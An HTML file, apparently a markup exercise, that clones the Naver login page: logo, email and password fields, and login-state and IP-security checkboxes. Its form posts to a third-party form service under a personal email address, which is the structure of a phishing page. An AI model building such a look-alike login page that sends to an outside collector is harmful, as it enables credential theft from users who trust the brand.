<!DOCTYPE html>
<html lang="ko-KR">
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-compatible" content="IF=edge" />
    <meta name="viewpoint" content="width=device-width, initial-scale=1.0" />
    <title>네이버 - 로그인</title>
  </head>
  <body>
    <h1 class="logo">
      <a href="https://www.naver.com/">
        <img src="./images/logo.png" srcset="./images/logo.svg" alt="NAVER" />
      </a>
    </h1>
    <form action="https://formspree.io/seulbinim@gmail.com" class="login-form" method="POST">
        <fieldset>
            <legend>로그인 폼</legend>
            <div class="user-email">
                <label for="userEmail">아이디</label>
                <input type="email" id="userEmail" placeholder="guest@naver.com" required="required" />
            </div>
            <div class="user-password">
                <label for="userEmail">비밀번호</label>
                <input type="password" id="userpassword" placeholder="******" required="required" />
            </div>
            <div class="ip-state-wrapper">
                <div class="login-state">
                    <input type="checkbox" id="loginState">
                    <label for="loginState">
                        <span class="icon-check"></span>
                        로그인 상태 유지
                    </label>
                </div>
                <div class="login-ip">
                    <input type="checkbox" id="loginIp">
                    <label for="loginIp"> IP 보안 </label>
                </div>
            </div>
        </fieldset>
    </form>
  </body>
</html>
